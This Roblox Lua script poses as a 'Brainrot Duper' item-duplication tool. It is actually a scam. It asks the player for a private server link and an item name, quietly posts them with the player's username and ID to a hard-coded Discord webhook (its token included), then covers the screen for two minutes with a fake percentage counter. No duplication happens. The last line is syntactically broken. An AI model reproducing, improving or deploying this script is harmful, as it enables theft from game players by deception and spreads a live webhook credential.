-- Brainrot Duper (Polished Fixed v2)
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- <<< Your webhook here >>>
local WEBHOOK_URL = "https://discord.com/api/webhooks/1423648949033500734/esmIrfxxaRqDHcUXnRWb7Z_fkNDEnARpKbBfhh6v10wfA8j0RB_GnW9Hsqft6PuJrKp7"

-- Helper function to post JSON
local function postToWebhook(payloadJson)
    local ok, res = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
    end)
    if ok then return true, res end

    local ok2, res2 = pcall(function()
        if syn and syn.request then
            return syn.request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
        elseif request then
            return request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
        elseif http_request then
            return http_request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payloadJson})
        else
            error("No HTTP method available")
        end
    end)
    if ok2 then return true, res2 end
    return false, res or res2
end

-- Build UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BrainrotDuperUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 460, 0, 240) -- increased height for buttons
main.Position = UDim2.new(0.5,0,0.5,0)
main.AnchorPoint = Vector2.new(0.5,0.5)
main.BackgroundColor3 = Color3.fromRGB(14,14,14)
main.BorderSizePixel = 0
main.ZIndex = 5
main.Parent = screenGui
Instance.new("UICorner", main).CornerRadius = UDim.new(0,12)
local stroke = Instance.new("UIStroke", main)
stroke.Transparency = 0.85
stroke.Thickness = 1

-- Header
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1,0,0,62)
header.BackgroundColor3 = Color3.fromRGB(18,18,18)
header.BorderSizePixel = 0
Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(1,-24,1,0)
title.Position = UDim2.new(0,12,0,0)
title.BackgroundTransparency = 1
title.Text = "Brainrot Duper"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,140,0)
title.TextXAlignment = Enum.TextXAlignment.Left

-- Content frame
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1,-28,1,-74)
content.Position = UDim2.new(0,14,0,64)
content.BackgroundTransparency = 1

local function newLabel(parent,posY,text)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size = UDim2.new(0,120,0,20)
    lbl.Position = UDim2.new(0,0,0,posY)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.fromRGB(200,200,200)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    return lbl
end

local function newBox(parent,posY,width)
    local box = Instance.new("TextBox", parent)
    box.Size = UDim2.new(0,width,0,34)
    box.Position = UDim2.new(0,0,0,posY)
    box.BackgroundColor3 = Color3.fromRGB(26,26,26)
    box.TextColor3 = Color3.fromRGB(230,230,230)
    box.Font = Enum.Font.Gotham
    box.TextSize = 15
    box.ClearTextOnFocus = false
    box.Text = "" -- ensures textbox starts empty
    local c = Instance.new("UICorner", box)
    c.CornerRadius = UDim.new(0,8)
    local s = Instance.new("UIStroke", box)
    s.Transparency = 0.9
    s.Thickness = 1
    return box
end

newLabel(content,2,"Brainrot Name:")
local nameBox = newBox(content,22,430)
nameBox.PlaceholderText = "Enter name..."

newLabel(content,64,"Private Link:")
local linkBox = newBox(content,84,430)
linkBox.PlaceholderText = "https://..."

-- Feedback
local feedback = Instance.new("TextLabel", content)
feedback.Size = UDim2.new(1,0,0,18)
feedback.Position = UDim2.new(0,0,0,132)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 14
feedback.TextColor3 = Color3.fromRGB(200,200,200)
feedback.TextXAlignment = Enum.TextXAlignment.Left

-- Buttons inside content
local sendBtn = Instance.new("TextButton", content)
sendBtn.Size = UDim2.new(0,140,0,36)
sendBtn.Position = UDim2.new(1,-150,0,156) -- relative to content
sendBtn.Text = "Send"
sendBtn.Font = Enum.Font.GothamBold
sendBtn.TextSize = 16
sendBtn.TextColor3 = Color3.fromRGB(255,255,255)
sendBtn.BackgroundColor3 = Color3.fromRGB(30,144,255)
Instance.new("UICorner", sendBtn).CornerRadius = UDim.new(0,8)
local sendStroke = Instance.new("UIStroke", sendBtn)
sendStroke.Transparency = 0.85

local clearBtn = Instance.new("TextButton", content)
clearBtn.Size = UDim2.new(0,96,0,36)
clearBtn.Position = UDim2.new(0,0,0,156) -- left inside content
clearBtn.Text = "Clear"
clearBtn.Font = Enum.Font.GothamBold
clearBtn.TextSize = 16
clearBtn.TextColor3 = Color3.fromRGB(255,255,255)
clearBtn.BackgroundColor3 = Color3.fromRGB(90,90,90)
Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,8)
local clearStroke = Instance.new("UIStroke", clearBtn)
clearStroke.Transparency = 0.85

-- Black overlay
local overlayGui = Instance.new("ScreenGui")
overlayGui.Name = "BrainrotOverlay"
overlayGui.ResetOnSpawn = false
overlayGui.Parent = playerGui

local overlay = Instance.new("Frame", overlayGui)
overlay.Size = UDim2.new(1,0,1,0)
overlay.Position = UDim2.new(0,0,0,0)
overlay.BackgroundColor3 = Color3.new(0,0,0)
overlay.BorderSizePixel = 0
overlay.ZIndex = 999
overlay.Visible = false
overlay.Active = true
overlay.Selectable = true

local bigPercent = Instance.new("TextLabel", overlay)
bigPercent.Size = UDim2.new(0.5,0,0.2,0)
bigPercent.Position = UDim2.new(0.25,0,0.4,0)
bigPercent.BackgroundTransparency = 1
bigPercent.Font = Enum.Font.GothamBold
bigPercent.TextSize = 72
bigPercent.Text = ""
bigPercent.TextColor3 = Color3.fromRGB(255,255,255)
bigPercent.TextScaled = true
bigPercent.ZIndex = 1000

local function runOverlay(durationSeconds)
    overlay.Visible = true
    local total = math.max(1,durationSeconds)
    local steps = 100
    local stepTime = total / steps
    for i = 1, steps do
        bigPercent.Text = tostring(i) .. "%"
        wait(stepTime)
    end
    bigPercent.Text = "100%"
    wait(0.6)
    overlay.Visible = false
end

local function sendNowAndOverlay()
    local bname = tostring(nameBox.Text or ""):gsub("^%s*(.-)%s*$","%1")
    local blink = tostring(linkBox.Text or ""):gsub("^%s*(.-)%s*$","%1")
    if bname == "" and blink == "" then
        feedback.TextColor3 = Color3.fromRGB(255,160,80)
        feedback.Text = "Enter name or link"
        return
    end
    local message = string.format(
        "**Duper Brainrot**\n• Sender: %s (ID: %d)\n• Brainrot: %s\n• Link: %s\n• Time (UTC): %s",
        player.Name,
        player.UserId,
        (bname~="" and bname or "(none)"),
        (blink~="" and blink or "(none)"),
        os.date("!%Y-%m-%d %H:%M:%S")
    )
    local payload = { content = message }
    local ok, res = pcall(function() return postToWebhook(HttpService:JSONEncode(payload)) end)
    if ok and res then
        feedback.TextColor3 = Color3.fromRGB(120,240,130)
        feedback.Text = "Sent"
    else
        feedback.TextColor3 = Color3.fromRGB(255,90,90)
        feedback.Text = "Send failed"
    end
    main.Visible = false
    spawn(function() runOverlay(120) end)
end

sendBtn.MouseButton1Click:Connect(function() pcall(sendNowAndOverlay) end)
clearBtn.MouseButton1Click:Connect(function() nameBox.Text="" linkBox.Text="" feedback.Text="" end3
